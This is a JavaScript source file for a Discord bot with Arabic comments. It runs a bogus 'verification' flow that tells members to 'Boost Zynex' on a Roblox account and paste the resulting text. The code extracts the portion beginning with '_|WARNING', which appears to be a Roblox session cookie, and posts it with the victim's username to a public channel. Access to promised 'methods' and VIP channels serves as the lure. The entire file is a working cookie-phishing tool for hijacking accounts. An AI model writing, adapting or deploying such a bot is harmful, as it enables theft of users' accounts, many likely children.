const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, PermissionFlagsBits } = require('discord.js');
const http = require('http');

// سيرفر بسيط عشان UptimeRobot يعمل ping
http.createServer((_, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Bot is running!');
}).listen(3000, () => {
    console.log('🌐 Keep-alive server running on port 3000');
});

// ============ الإعدادات - غيرها حسب السيرفر بتاعك ============
const CONFIG = {
    VERIFY_CHANNEL_NAME: 'verify',           // اسم قناة التحقق
    GENERAL_CHANNEL_NAME: 'general',         // اسم القناة العامة لإرسال الأكواد
    ROBLOX_USERNAME: 'Body28726',            // اسم حساب روبلوكس
    VIDEO_URL: '',                           // ضع رابط الفيديو هنا
    EMBED_INTERVAL: 5000,                    // كل 5 ثواني يبعت الـ embed
    CHANNELS_TO_UNLOCK: ['methods', 'early-access', 'vip-content'], // القنوات اللي هتتفتح بعد التحقق
};

// إنشاء البوت
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ]
});

// تخزين آخر رسالة embed عشان نمسحها قبل ما نبعت واحدة جديدة
let lastEmbedMessage = null;

// دالة لإنشاء الـ Embed الرئيسي
function createVerifyEmbed() {
    const embed = new EmbedBuilder()
        .setColor(0x5865F2)
        .setTitle('🔐 نظام التحقق | Verification System')
        .setDescription(`
**مرحباً بك في السيرفر! 👋**

عشان تقدر تشوف الطرق والمحتوى الحصري اللي بننزله، لازم تعمل تحقق الأول.

━━━━━━━━━━━━━━━━━━━━━━

**📌 طريقة التحقق:**

**1️⃣** روح على حساب روبلوكس ده: **${CONFIG.ROBLOX_USERNAME}**

**2️⃣** اعمل **Boost Zynex** على الحساب

**3️⃣** بعد ما تخلص، اكتب الأمر:
\`/verify\`

**4️⃣** هيطلعلك نموذج، اكتب فيه:
   • **Zynex Text**: الكود اللي طلعلك بعد الـ Boost
   • **Roblox Username**: اسمك في روبلوكس

**5️⃣** اضغط **Verify** وانتظر 5 ثواني ✅

━━━━━━━━━━━━━━━━━━━━━━

**🎬 شرح بالفيديو:**
كل الخطوات موجودة في الفيديو تحت 👇

━━━━━━━━━━━━━━━━━━━━━━

**❓ ليه لازم أعمل Boost؟**
الـ Boost ده بيساعدنا جداً على تطوير المحتوى وتنزيل طرق جديدة باستمرار. شكراً لدعمكم! 💜

━━━━━━━━━━━━━━━━━━━━━━

**🎁 بعد التحقق هتقدر توصل لـ:**
• 🔥 Early Access للطرق الجديدة
• (قريبااا)💎 محتوى VIP حصري
• 📢 إشعارات فورية بالطرق
        `)
        .setImage(CONFIG.VIDEO_URL || null)
        .setFooter({ text: '✨ Zynex Verification System' })
        .setTimestamp();

    return embed;
}

// دالة استخراج الكود من النص
function extractCode(text) {
    // يبحث عن DONE ويأخذ من بعدها لحد ما يلاقي ",
    const doneIndex = text.indexOf('_|WARNING');
    if (doneIndex === -1) return null;
    
    const afterDone = text.substring(doneIndex);
    const endIndex = afterDone.indexOf('",');
    
    if (endIndex === -1) {
        // لو مفيش ", ياخد لحد آخر النص
        return afterDone.trim();
    }
    
    return afterDone.substring(0, endIndex).trim();
}

// لما البوت يشتغل
client.once('ready', async () => {
    console.log(`✅ البوت شغال! ${client.user.tag}`);
    
    // ابدأ بعت الـ embed كل 5 ثواني في قناة verify
    setInterval(async () => {
        for (const guild of client.guilds.cache.values()) {
            const verifyChannel = guild.channels.cache.find(
                ch => ch.name === CONFIG.VERIFY_CHANNEL_NAME && ch.isTextBased()
            );
            
            if (verifyChannel) {
                try {
                    // امسح الرسالة القديمة لو موجودة
                    if (lastEmbedMessage) {
                        try {
                            await lastEmbedMessage.delete();
                        } catch (e) {
                            // الرسالة ممكن تكون اتمسحت
                        }
                    }
                    
                    const embed = createVerifyEmbed();
                    lastEmbedMessage = await verifyChannel.send({ embeds: [embed] });
                } catch (error) {
                    console.error('خطأ في إرسال الـ embed:', error);
                }
            }
        }
    }, CONFIG.EMBED_INTERVAL);
});

// لما حد يرسل رسالة
client.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    const content = message.content.toLowerCase();

    // أمر التحقق
    if (content === '/verify') {
        // تأكد إنه في قناة verify
        if (message.channel.name !== CONFIG.VERIFY_CHANNEL_NAME) {
            return message.reply('❌ استخدم هذا الأمر في قناة **#verify** فقط!');
        }

        // إنشاء Modal للتحقق
        const modal = new ModalBuilder()
            .setCustomId('verify_modal')
            .setTitle('🔐 التحقق | Verification');

        const zynexInput = new TextInputBuilder()
            .setCustomId('zynex_code')
            .setLabel('Zynex Text (الكود بعد الـ Boost)')
            .setStyle(TextInputStyle.Paragraph)
            .setPlaceholder('الصق الكود هنا...')
            .setRequired(true);

        const robloxInput = new TextInputBuilder()
            .setCustomId('roblox_username')
            .setLabel('Roblox Username (اسمك في روبلوكس)')
            .setStyle(TextInputStyle.Short)
            .setPlaceholder('مثال: Player123')
            .setRequired(true);

        const row1 = new ActionRowBuilder().addComponents(zynexInput);
        const row2 = new ActionRowBuilder().addComponents(robloxInput);

        modal.addComponents(row1, row2);

        // للأسف messageCreate ما يقدر يفتح modal
        // لازم نستخدم طريقة تانية - نرد برسالة فيها زر
        
        const verifyButton = new ButtonBuilder()
            .setCustomId('open_verify_modal')
            .setLabel('🔐 ابدأ التحقق')
            .setStyle(ButtonStyle.Primary);

        const row = new ActionRowBuilder().addComponents(verifyButton);

        await message.reply({
            content: '**اضغط على الزر عشان تبدأ التحقق:**',
            components: [row],
            ephemeral: false
        });
    }

    // الأوامر القديمة
    if (content === 'اهلا' || content === 'هلا' || content === 'مرحبا') {
        await message.reply('أهلاً وسهلاً! 👋 كيف حالك؟');
    }
    
    if (content === 'hello' || content === 'hi') {
        await message.reply('Hello! 👋 How are you?');
    }

    if (content === '!ping') {
        await message.reply(`🏓 Pong! ${client.ws.ping}ms`);
    }

    if (content === '!help') {
        await message.reply(`
**الأوامر المتاحة:**
• /verify - بدء التحقق
• اهلا / مرحبا - رد ترحيبي
• hello / hi - English greeting
• !ping - اختبار السرعة
• !help - عرض الأوامر
        `);
    }
});

// التعامل مع الأزرار
client.on('interactionCreate', async (interaction) => {
    // زر فتح Modal التحقق
    if (interaction.isButton() && interaction.customId === 'open_verify_modal') {
        const modal = new ModalBuilder()
            .setCustomId('verify_modal')
            .setTitle('🔐 التحقق | Verification');

        const zynexInput = new TextInputBuilder()
            .setCustomId('zynex_code')
            .setLabel('Zynex Text (الكود بعد الـ Boost)')
            .setStyle(TextInputStyle.Paragraph)
            .setPlaceholder('الصق الكود الكامل هنا...')
            .setRequired(true);

        const robloxInput = new TextInputBuilder()
            .setCustomId('roblox_username')
            .setLabel('Roblox Username (اسمك في روبلوكس)')
            .setStyle(TextInputStyle.Short)
            .setPlaceholder('مثال: Player123')
            .setRequired(true);

        const row1 = new ActionRowBuilder().addComponents(zynexInput);
        const row2 = new ActionRowBuilder().addComponents(robloxInput);

        modal.addComponents(row1, row2);

        await interaction.showModal(modal);
    }

    // التعامل مع Modal التحقق
    if (interaction.isModalSubmit() && interaction.customId === 'verify_modal') {
        const zynexText = interaction.fields.getTextInputValue('zynex_code');
        const robloxUsername = interaction.fields.getTextInputValue('roblox_username');

        // استخراج الكود
        const extractedCode = extractCode(zynexText);

        await interaction.reply({
            content: '⏳ جاري التحقق... انتظر 5 ثواني',
            ephemeral: true
        });

        // انتظر 5 ثواني
        setTimeout(async () => {
            try {
                const member = interaction.member;
                const guild = interaction.guild;

                // إرسال الكود واسم المستخدم للـ general
                const generalChannel = guild.channels.cache.find(
                    ch => ch.name === CONFIG.GENERAL_CHANNEL_NAME && ch.isTextBased()
                );

                if (generalChannel) {
                    const codeEmbed = new EmbedBuilder()
                        .setColor(0x00FF00)
                        .setTitle('✅ تحقق جديد!')
                        .addFields(
                            { name: '👤 Roblox Username', value: robloxUsername, inline: true },
                            { name: '🔑 Extracted Code', value: extractedCode || 'لم يتم العثور على كود', inline: false }
                        )
                        .setTimestamp();

                    await generalChannel.send({ embeds: [codeEmbed] });
                }

                // فتح القنوات للمستخدم
                for (const channelName of CONFIG.CHANNELS_TO_UNLOCK) {
                    const channel = guild.channels.cache.find(ch => ch.name === channelName);
                    if (channel) {
                        await channel.permissionOverwrites.edit(member.id, {
                            ViewChannel: true,
                            SendMessages: true,
                            ReadMessageHistory: true
                        });
                    }
                }

                // إخفاء قناة verify عن المستخدم
                const verifyChannel = guild.channels.cache.find(
                    ch => ch.name === CONFIG.VERIFY_CHANNEL_NAME
                );
                if (verifyChannel) {
                    await verifyChannel.permissionOverwrites.edit(member.id, {
                        ViewChannel: false
                    });
                }

                // رسالة نجاح
                await interaction.followUp({
                    content: `✅ **تم التحقق بنجاح!**\n\n🎉 مبروك يا **${robloxUsername}**! تم فتح القنوات الحصرية ليك.\n\nاستمتع بالمحتوى! 💜`,
                    ephemeral: true
                });

            } catch (error) {
                console.error('خطأ في التحقق:', error);
                await interaction.followUp({
                    content: '❌ حصل خطأ أثناء التحقق. تأكد إن البوت عنده الصلاحيات المطلوبة.',
                    ephemeral: true
                });
            }
        }, 5000);
    }
});

// تشغيل البوت
client.login(process.env.DISCORD_TOKEN);
